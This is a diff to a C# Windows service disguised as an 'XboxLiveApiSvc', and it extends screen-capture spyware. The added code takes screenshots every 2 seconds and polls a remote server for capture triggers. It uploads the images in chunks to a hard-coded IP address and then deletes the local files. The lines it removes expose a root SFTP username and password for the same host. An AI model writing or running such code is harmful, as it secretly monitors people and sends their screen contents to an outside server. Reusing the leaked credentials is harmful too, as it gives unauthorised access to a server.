@@ -1,19 +1,23 @@
-﻿using System;
+﻿using Renci.SshNet;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Diagnostics;
-using System.IO;
-using System.Linq;
-using System.Runtime.InteropServices;
-using System.ServiceProcess;
-using System.Text;
-using System.Threading.Tasks;
-using System.Timers;
 using System.Drawing;
 using System.Drawing.Imaging;
-using Renci.SshNet;
-using System.Windows.Forms;
+using System.IO;
+using System.Linq;
+using System.Net.Http;
+using System.Net.Http.Headers;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Timers;
 
 namespace XbozPcAppFT
 {
@@ -39,8 +43,69 @@ namespace XbozPcAppFT
         public int dwCheckPoint;
         public int dwWaitHint;
     };
+
+
+
+    public class HttpUploader
+    {
+        private static readonly HttpClient client = new HttpClient();
+        private const int ChunkSize = 1024 * 1024; // 1MB
+
+        public static async Task UploadFileAsync(string localPath, string serverUrl)
+        {
+            FileInfo fi = new FileInfo(localPath);
+            long totalSize = fi.Length;
+            string fileName = Path.GetFileName(localPath);
+
+            using (FileStream fs = new FileStream(localPath, FileMode.Open, FileAccess.Read))
+            {
+                long offset = 0;
+                while (offset < totalSize)
+                {
+                    int bytesToRead = (int)Math.Min(ChunkSize, totalSize - offset);
+                    byte[] buffer = new byte[bytesToRead];
+                    fs.Seek(offset, SeekOrigin.Begin);
+                    await fs.ReadAsync(buffer, 0, bytesToRead);
+
+                    bool success = false;
+                    int retries = 3;
+                    while (!success && retries > 0)
+                    {
+                        try
+                        {
+                            using (var content = new ByteArrayContent(buffer))
+                            {
+                                content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
+                                content.Headers.Add("Content-Range", $"bytes {offset}-{offset + bytesToRead - 1}/{totalSize}");
+
+                                HttpResponseMessage response = await client.PostAsync($"{serverUrl}/upload/{fileName}", content);
+                                response.EnsureSuccessStatusCode();
+                                success = true;
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            retries--;
+                            Console.WriteLine($"Retrying chunk {offset} - {ex.Message}");
+                            if (retries == 0) throw;
+                        }
+                    }
+
+                    offset += bytesToRead;
+                }
+            }
+
+            Console.WriteLine("Upload complete!");
+            File.Delete(localPath);
+        }
+    }
+
+
     public partial class XboxLiveApiSvc : ServiceBase
     {
+        private Thread _triggerThread;
+        private CancellationTokenSource _cts;
+
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);
 
@@ -73,13 +138,19 @@ namespace XbozPcAppFT
             _eventLog1.WriteEntry("Taking immediate screenshot on start...");
             TakeScreenshot();
 
-            // 2️⃣ Set up a timer that triggers every minute.
+            // 2️⃣ Set up a timer that triggers every 30s.
             System.Timers.Timer timer = new System.Timers.Timer
             {
-                Interval = 30000 // 30 seconds
+                Interval = 2000 // 2 seconds
             };
             timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
             timer.Start();
+
+            // 3️⃣ Start trigger polling loop in background thread
+            _cts = new CancellationTokenSource();
+            _triggerThread = new Thread(() => PollTriggerLoop(_cts.Token));
+            _triggerThread.IsBackground = true;
+            _triggerThread.Start();
 
             // Update the service state to Running.
             serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
@@ -89,6 +160,17 @@ namespace XbozPcAppFT
         protected override void OnStop()
         {
             _eventLog1.WriteEntry("In OnStop.");
+
+            // Stop polling thread
+            if (_cts != null)
+            {
+                _cts.Cancel();
+                if (_triggerThread != null && _triggerThread.IsAlive)
+                {
+                    _triggerThread.Join(); // wait until thread exits
+                }
+            }
+
             // Update the service state to Stop Pending.
             ServiceStatus serviceStatus = new ServiceStatus();
             serviceStatus.dwCurrentState = ServiceState.SERVICE_STOP_PENDING;
@@ -98,6 +180,50 @@ namespace XbozPcAppFT
             // Update the service state to Stopped.
             serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
             SetServiceStatus(this.ServiceHandle, ref serviceStatus);
+        }
+
+        private void PollTriggerLoop(CancellationToken token)
+        {
+            _eventLog1.WriteEntry("Trigger polling thread started.");
+            try
+            {
+                while (!token.IsCancellationRequested)
+                {
+                    // ✅ Example: poll your /trigger endpoint
+                    bool shouldTakeScreenshot = CheckTriggerFromServer();
+
+                    if (shouldTakeScreenshot)
+                    {
+                        _eventLog1.WriteEntry("Trigger received! Taking screenshot...");
+                        TakeScreenshot();
+                    }
+
+                    Thread.Sleep(5000); // poll every 5 seconds
+                }
+            }
+            catch (Exception ex)
+            {
+                _eventLog1.WriteEntry($"PollTriggerLoop exception: {ex.Message}");
+            }
+            finally
+            {
+                _eventLog1.WriteEntry("Trigger polling thread stopped.");
+            }
+        }
+
+        private bool CheckTriggerFromServer()
+        {
+            // TODO: implement HTTP GET/POST to your FastAPI /trigger
+            // Example pseudo-code (use HttpClient):
+            /*
+            using (var client = new HttpClient())
+            {
+                var response = client.GetAsync("http://server:8000/check_trigger").Result;
+                string result = response.Content.ReadAsStringAsync().Result;
+                return result.Contains("take_screenshot");
+            }
+            */
+            return false;
         }
 
         private void OnTimer(object sender, ElapsedEventArgs e)
@@ -141,7 +267,7 @@ namespace XbozPcAppFT
                 }
 
                 // 2️⃣ Wait briefly to allow screenshot tool to finish
-                System.Threading.Thread.Sleep(3000); // 3 seconds — adjust if needed
+                System.Threading.Thread.Sleep(1000); // 1 seconds — adjust if needed
 
                 // 3️⃣ Find the latest screenshot file
                 var latestScreenshot = new DirectoryInfo(userTempDir)
@@ -163,25 +289,9 @@ namespace XbozPcAppFT
                 // 4️⃣ Upload via SFTP
                 try
                 {
-                    string host = "202.182.127.60";
-                    string username = "root";
-                    string password = "6,CkoCF*AY59?r6@";
-                    string remoteDirectory = "/root/screenshots/";
+                    string serverUrl = "http://202.182.127.60:8000"; // FastAPI server endpoint
 
-                    using (var sftp = new SftpClient(host, 22, username, password))
-                    {
-                        sftp.Connect();
-
-                        if (!sftp.Exists(remoteDirectory))
-                            sftp.CreateDirectory(remoteDirectory);
-
-                        using (var fileStream = new FileStream(localPath, FileMode.Open))
-                        {
-                            sftp.UploadFile(fileStream, Path.Combine(remoteDirectory, fileName));
-                        }
-
-                        sftp.Disconnect();
-                    }
+                    HttpUploader.UploadFileAsync(localPath, serverUrl).GetAwaiter().GetResult();
 
                     // 5️⃣ Clean up
                     File.Delete(localPath);
